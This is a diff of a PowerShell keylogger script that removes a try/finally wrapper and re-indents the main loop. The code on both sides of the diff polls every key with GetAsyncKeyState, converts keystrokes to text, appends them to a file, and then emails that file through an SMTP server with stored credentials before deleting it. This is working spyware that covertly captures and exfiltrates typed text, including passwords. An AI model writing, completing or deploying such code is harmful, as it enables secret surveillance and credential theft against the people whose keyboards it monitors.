@@ -25,37 +25,32 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
     $null = New-Item -Path $Path -ItemType File -Force
 
-    try {
-        while ($true) {
-            $Runner = 0
-            while ($TimesToRun -ge $Runner) {
-                $TimeStart = Get-Date
-                $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
-                while ($TimeEnd -ge (Get-Date)) {
-                    Start-Sleep -Milliseconds 40
-                    for ($ascii = 9; $ascii -le 254; $ascii++) {
-                        $state = $API::GetAsyncKeyState($ascii)
-                        if ($state -eq -32767) {
-                            $null = [console]::CapsLock
-                            $virtualKey = $API::MapVirtualKey($ascii, 3)
-                            $kbstate = New-Object Byte[] 256
-                            $checkkbstate = $API::GetKeyboardState($kbstate)
-                            $mychar = New-Object -TypeName System.Text.StringBuilder
-                            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-                            if ($success) {
-                                [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
-                            }
+    while ($true) {
+        $Runner = 0
+        while ($TimesToRun -ge $Runner) {
+            $TimeStart = Get-Date
+            $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
+            while ($TimeEnd -ge (Get-Date)) {
+                Start-Sleep -Milliseconds 40
+                for ($ascii = 9; $ascii -le 254; $ascii++) {
+                    $state = $API::GetAsyncKeyState($ascii)
+                    if ($state -eq -32767) {
+                        $null = [console]::CapsLock
+                        $virtualKey = $API::MapVirtualKey($ascii, 3)
+                        $kbstate = New-Object Byte[] 256
+                        $checkkbstate = $API::GetKeyboardState($kbstate)
+                        $mychar = New-Object -TypeName System.Text.StringBuilder
+                        $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+                        if ($success) {
+                            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                         }
                     }
                 }
-                send-mailmessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
-                Remove-Item -Path $Path -Force
-                $Runner++
             }
+            send-mailmessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
+            Remove-Item -Path $Path -Force
+            $Runner++
         }
-    }
-    finally {
-        # Removido o exit 1 para evitar o fechamento do PowerShell
     }
 }
 
